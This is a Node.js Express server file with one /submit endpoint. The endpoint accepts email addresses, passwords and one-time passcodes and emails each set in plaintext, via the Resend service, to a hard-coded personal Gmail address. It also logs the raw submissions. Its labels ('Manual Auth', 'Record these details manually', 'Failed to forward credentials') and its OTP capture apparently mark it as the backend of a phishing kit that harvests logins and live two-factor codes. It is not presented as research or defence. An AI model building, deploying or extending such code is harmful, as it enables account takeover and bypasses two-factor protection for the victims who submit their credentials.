const express = require("express");
const cors = require("cors");
const { Resend } = require("resend");

const app = express();

const resend = process.env.RESEND_API_KEY
  ? new Resend(process.env.RESEND_API_KEY)
  : null;

// Ensure ADMIN_EMAIL matches your Resend login email if using onboarding@resend.dev
const ADMIN_EMAIL = process.env.ADMIN_EMAIL || "nicholaszobo@gmail.com";
const FROM_EMAIL = process.env.FROM_EMAIL || "onboarding@resend.dev";

app.use(cors());
app.use(express.json());

// Helper function to escape HTML special characters
function escapeHtml(value) {
  if (!value) return "";
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

app.post("/submit", async (req, res) => {
  const { type, email, password, otp } = req.body;
  const timestamp = new Date().toISOString();

  console.log("Received data:", req.body);

  if (!resend) {
    return res.status(500).json({
      success: false,
      message: "Resend API key is not configured."
    });
  }

  try {
    let emailSubject = "";
    let emailHtml = "";

    // 1. ACCOUNT CREATION
    if (type === "account") {
      if (!email || !password) {
        return res.status(400).json({
          success: false,
          message: "Email and password are required."
        });
      }

      emailSubject = `[Manual Auth] New Account: ${email}`;
      emailHtml = `
        <h2>New User Credentials Submitted</h2>
        <p><strong>Email:</strong> ${escapeHtml(email)}</p>
        <p><strong>Password:</strong> ${escapeHtml(password)}</p>
        <p><strong>Submitted At:</strong> ${timestamp}</p>
        <hr />
        <p><em>Action Required: Record these details manually.</em></p>
      `;
    } 
    // 2. OTP VERIFICATION
    else if (type === "verification") {
      if (!email || !otp) {
        return res.status(400).json({
          success: false,
          message: "Email and OTP are required."
        });
      }

      emailSubject = `[Manual Auth] OTP Verification: ${email}`;
      emailHtml = `
        <h2>OTP Submission</h2>
        <p><strong>Email:</strong> ${escapeHtml(email)}</p>
        <p><strong>Entered OTP:</strong> ${escapeHtml(otp)}</p>
        <p><strong>Submitted At:</strong> ${timestamp}</p>
      `;
    } 
    else {
      return res.status(400).json({
        success: false,
        message: "Invalid submission type."
      });
    }

    // Send email via Resend
    const response = await resend.emails.send({
      from: FROM_EMAIL,
      to: ADMIN_EMAIL,
      subject: emailSubject,
      html: emailHtml
    });

    console.log("RESEND RESULT:", JSON.stringify(response));

    // Check if Resend returned an explicit API error
    if (response.error) {
      console.error("Resend API returned an error:", response.error);
      return res.status(500).json({
        success: false,
        message: response.error.message || "Failed to send email via Resend."
      });
    }

    return res.json({
      success: true,
      message: "Data processed and notification sent successfully.",
      id: response.data?.id
    });

  } catch (error) {
    console.error("Failed to send email via Resend:", error);
    return res.status(500).json({
      success: false,
      message: "Failed to forward credentials.",
      error: error.message
    });
  }
});

module.exports = app;